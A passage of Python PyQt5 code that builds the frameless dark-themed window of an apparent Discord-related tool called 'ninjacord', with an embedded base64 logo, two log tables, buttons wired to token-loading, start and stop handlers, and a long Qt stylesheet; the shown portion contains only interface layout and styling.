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iAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABiAoAMAYACCDgCAAQg6AAAGIOgAABjg/wFjD0NtsrZljQAAAABJRU5ErkJggg==']        
        self.logo = QtWidgets.QLabel(self.panel)
        self.logo.setGeometry(QtCore.QRect(20, 550, 241, 241))
        self.logo.setStyleSheet("")
        self.logo.setText("")
        self.logo.setPixmap(self.show_image(self.encoded_data[0]))
        self.logo.setScaledContents(True)
        self.logo.setObjectName("logo")
        self.tablo2 = QtWidgets.QTableWidget(self.centralwidget)
        self.tablo2.setGeometry(QtCore.QRect(920, 60, 551, 811))
        self.tablo2.setObjectName("tablo2")
        self.tablo2.setColumnCount(1)
        self.tablo2.setRowCount(0)
        self.tablo2.setHorizontalHeaderLabels(['Console Log'])
        self.tablo2.horizontalHeader().setStretchLastSection(True)
        self.tablo2.setStyleSheet("QHeaderView::section  {\n"
"    background-color: #3A3939;\n"
"    color: silver;\n"
"    padding: 4px;\n"
"    border: 1px solid #6c6c6c;\n"
"    border-radius: 0px;\n"
"    text-align: center;\n"
"}\n"
"QTableView\n"
"{\n"
"    border: 1px solid #444;\n"
"    gridline-color: #6c6c6c;\n"
"    background-color: #201F1F;\n"
"}\n"
"\n"
"\n"
"QTableView, QHeaderView\n"
"{\n"
"    border-radius: 0px;\n"
"    color:rgb(0, 255, 255)\n"
"}\n"
"\n"
"QTableView::item:pressed, QListView::item:pressed, QTreeView::item:pressed  {\n"
"    background: #78879b;\n"
"    color: #FFFFFF;\n"
"}\n"
"\n"
"QTableView::item:selected:active, QTreeView::item:selected:active, QListView::item:selected:active  {\n"
"    background: #3d8ec9;\n"
"    color: #FFFFFF;\n"
"}\n"
"QTableCornerButton::section {\n"
"    background-color: #3A3939;\n"
"    border: 1px solid #3A3939;\n"
"    border-radius: 2px;\n"
"}")                
        self.tablo1 = QtWidgets.QTableWidget(self.centralwidget)
        self.tablo1.setGeometry(QtCore.QRect(320, 60, 581, 811))
        self.tablo1.setObjectName("tablo1")
        self.tablo1.setColumnCount(1)
        self.tablo1.setRowCount(0)
        self.tablo1.setHorizontalHeaderLabels(['Tools Log'])
        self.tablo1.horizontalHeader().setStretchLastSection(True)
        self.tablo1.setStyleSheet("QHeaderView::section  {\n"
"    background-color: #3A3939;\n"
"    color: silver;\n"
"    padding: 4px;\n"
"    border: 1px solid #6c6c6c;\n"
"    border-radius: 0px;\n"
"    text-align: center;\n"
"}\n"
"QTableView\n"
"{\n"
"    border: 1px solid #444;\n"
"    gridline-color: #6c6c6c;\n"
"    background-color: #201F1F;\n"
"}\n"
"\n"
"\n"
"QTableView, QHeaderView\n"
"{\n"
"    border-radius: 0px;\n"
"    color:rgb(0, 255, 255)\n"
"}\n"
"\n"
"QTableView::item:pressed, QListView::item:pressed, QTreeView::item:pressed  {\n"
"    background: #78879b;\n"
"    color: #FFFFFF;\n"
"}\n"
"\n"
"QTableView::item:selected:active, QTreeView::item:selected:active, QListView::item:selected:active  {\n"
"    background: #3d8ec9;\n"
"    color: #FFFFFF;\n"
"}\n"
"QTableCornerButton::section {\n"
"    background-color: #3A3939;\n"
"    border: 1px solid #3A3939;\n"
"    border-radius: 2px;\n"
"}")                
        self.setCentralWidget(self.centralwidget)

        self.loadbutton.clicked.connect(self.loadtoken)
        self.startbutton.clicked.connect(self.calistir)
        self.inputbutton.clicked.connect(self.durdur)

        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)


        self.kapat.clicked.connect(self.sayfakapat)
        self.kucult.clicked.connect(self.sayfakuluct)

    def setupUi2(self):
        self.setWindowFlag(Qt.FramelessWindowHint)
        self.setObjectName("ninjacord")
        self.resize(1280, 700)
        self.setMinimumSize(QtCore.QSize(1280, 700))
        self.setMaximumSize(QtCore.QSize(1280, 700))
        self.setStyleSheet("\n"
"QMainWindow {\n"
"    background-color:#1e1d23;\n"
"}\n"
"QDialog {\n"
"    background-color:#1e1d23;\n"
"}\n"
"QColorDialog {\n"
"    background-color:#1e1d23;\n"
"}\n"
"QTextEdit {\n"
"    background-color:#1e1d23;\n"
"    color: #a9b7c6;\n"
"}\n"
"QPlainTextEdit {\n"
"    selection-background-color:#23dae9;\n"
"    background-color:#1e1d23;\n"
"    border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: transparent;\n"
"    border-width: 1px;\n"
"    color: #a9b7c6;\n"
"}\n"
"\n"
"QToolButton {\n"
"    border-radius: 15px;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: #23dae9;\n"
"    border-bottom-width: 1px;\n"
"    border-radius: 15px;\n"
"    color: #a9b7c6;\n"
"    padding: 2px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"\n"
"\n"
"QToolButton:hover{\n"
"    border-width: 2px; border-radius: 15px;\n"
"    border-radius: 15px;\n"
"    border-color: #23dae9;\n"
"\n"
"    border-style: solid;\n"
"    color: #FFFFFF;\n"
"    padding-bottom: 1px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"\n"
"\n"
"\n"
"\n"
"QPushButton{\n"
"    border-style: solid;\n"
"\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding: 2px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QPushButton::default{\n"
"    border-style: inset;\n"
"\n"
"    color: #a9b7c6;\n"
"    padding: 2px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QPushButton:hover{\n"
"    border-style: solid;\n"
"\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding-bottom: 2px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QPushButton:pressed{\n"
"    border-style: solid;\n"
"\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding-bottom: 1px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QPushButton:disabled{\n"
"    border-style: solid;\n"
"\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding-bottom: 1px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"\n"
"QLineEdit {\n"
"    border-width: 2px; border-radius: 15px;\n"
"    border-color: #23dae9;\n"
"    border-style: inset;\n"
"    padding: 0 8px;\n"
"    color: #FFF;\n"
"    background:rgb(36,36,36);\n"
"    selection-background-color:#23dae9;\n"
"    selection-color: #FFFFFF;\n"
"}\n"
"\n"
"QLineEdit:hover{\n"
"    border: 2px solid #23dae9\n"
"}\n"
"\n"
"QLineEdit:focus{\n"
"    border:2px solid #23dae9\n"
"}\n"
"\n"
"\n"
"QLabel {\n"
"    color: #a9b7c6;\n"
"}\n"
"QLCDNumber {\n"
"    color: #23dae9;\n"
"}\n"
"QProgressBar {\n"
"    text-align: center;\n"
"    color: rgb(240, 240, 240);\n"
"    border-width: 1px; \n"
"    border-radius: 10px;\n"
"    border-color: rgb(58, 58, 58);\n"
"    border-style: inset;\n"
"    background-color:#1e1d23;\n"
"}\n"
"QProgressBar::chunk {\n"
"    background-color: #23dae9;\n"
"    border-radius: 5px;\n"
"}\n"
"QMenuBar {\n"
"    background-color: #1e1d23;\n"
"}\n"
"QMenuBar::item {\n"
"    color: #a9b7c6;\n"
"      spacing: 3px;\n"
"      padding: 1px 4px;\n"
"      background: #1e1d23;\n"
"}\n"
"\n"
"QMenuBar::item:selected {\n"
"      background:#1e1d23;\n"
"    color: #FFFFFF;\n"
"}\n"
"QMenu::item:selected {\n"
"    border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: #23dae9;\n"
"    border-bottom-color: transparent;\n"
"    border-left-width: 2px;\n"
"    color: #FFFFFF;\n"
"    padding-left:15px;\n"
"    padding-top:4px;\n"
"    padding-bottom:4px;\n"
"    padding-right:7px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QMenu::item {\n"
"    border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: transparent;\n"
"    border-bottom-width: 1px;\n"
"    border-style: solid;\n"
"    color: #a9b7c6;\n"
"    padding-left:17px;\n"
"    padding-top:4px;\n"
"    padding-bottom:4px;\n"
"    padding-right:7px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QMenu{\n"
"    background-color:#1e1d23;\n"
"}\n"
"QTabWidget {\n"
"    color:rgb(0,0,0);\n"
"    background-color:#1e1d23;\n"
"}\n"
"QTabWidget::pane {\n"
"        border-color: rgb(77,77,77);\n"
"        background-color:#1e1d23;\n"
"        border-style: solid;\n"
"        border-width: 1px;\n"
"        border-radius: 6px;\n"
"}\n"
"QTabBar::tab {\n"
"    border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: transparent;\n"
"    border-bottom-width: 1px;\n"
"    border-style: solid;\n"
"    color: #808086;\n"
"    padding: 3px;\n"
"    margin-left:3px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QTabBar::tab:selected, QTabBar::tab:last:selected, QTabBar::tab:hover {\n"
"      border-style: solid;\n"
"    border-top-color: transparent;\n"
"    border-right-color: transparent;\n"
"    border-left-color: transparent;\n"
"    border-bottom-color: #23dae9;\n"
"    border-bottom-width: 2px;\n"
"    border-style: solid;\n"
"    color: #FFFFFF;\n"
"    padding-left: 3px;\n"
"    padding-bottom: 2px;\n"
"    margin-left:3px;\n"
"    background-color: #1e1d23;\n"
"}\n"
"\n"
"QCheckBox {\n"
"    color: #a9b7c6;\n"
"    padding: 2px;\n"
"}\n"
"QCheckBox:disabled {\n"
"    color: #808086;\n"
"    padding: 2px;\n"
"}\n"
"\n"
"QCheckBox:hover {\n"
"    border-radius:4px;\n"
"    border-style:solid;\n"
"    padding-left: 1px;\n"
"    padding-right: 1px;\n"
"    padding-bottom: 1px;\n"
"    padding-top: 1px;\n"
"    border-width:1px;\n"
"    border-color: rgb(87, 97, 106);\n"
"    background-color:#1e1d23;\n"
"}\n"
"QCheckBox::indicator:checked {\n"
"\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-width: 1px;\n"
"    border-color: #23dae9;\n"
"    color: #a9b7c6;\n"
"    background-color: #23dae9;\n"
"}\n"
"QCheckBox::indicator:unchecked {\n"
"\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-width: 1px;\n"
"    border-color: #23dae9;\n"
"    color: #a9b7c6;\n"
"    background-color: transparent;\n"
"}\n"
"QRadioButton {\n"
"    color: #a9b7c6;\n"
"    background-color: #1e1d23;\n"
"    padding: 1px;\n"
"}\n"
"QRadioButton::indicator:checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: #23dae9;\n"
"    color: #a9b7c6;\n"
"    background-color: #23dae9;\n"
"}\n"
"QRadioButton::indicator:!checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: #23dae9;\n"
"    color: #a9b7c6;\n"
"    background-color: transparent;\n"
"}\n"
"QStatusBar {\n"
"    color:#027f7f;\n"
"}\n"
"QSpinBox {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QDoubleSpinBox {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QTimeEdit {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QDateTimeEdit {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QDateEdit {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QComboBox {\n"
"    color: #a9b7c6;    \n"
"    background: #1e1d23;\n"
"}\n"
"QComboBox:editable {\n"
"    background: #1e1d23;\n"
"    color: #a9b7c6;\n"
"    selection-background-color: #1e1d23;\n"
"}\n"
"QComboBox QAbstractItemView {\n"
"    color: #a9b7c6;    \n"
"    background: #1e1d23;\n"
"    selection-color: #FFFFFF;\n"
"    selection-background-color: #1e1d23;\n"
"}\n"
"QComboBox:!editable:on, QComboBox::drop-down:editable:on {\n"
"    color: #a9b7c6;    \n"
"    background: #1e1d23;\n"
"}\n"
"QFontComboBox {\n"
"    color: #a9b7c6;    \n"
"    background-color: #1e1d23;\n"
"}\n"
"QToolBox {\n"
"    color: #a9b7c6;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QToolBox::tab {\n"
"    color: #a9b7c6;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QToolBox::tab:selected {\n"
"    color: #FFFFFF;\n"
"    background-color: #1e1d23;\n"
"}\n"
"QScrollArea {\n"
"    color: #FFFFFF;\n"
"    background-color: #1e1d23;\n"
"}\n"
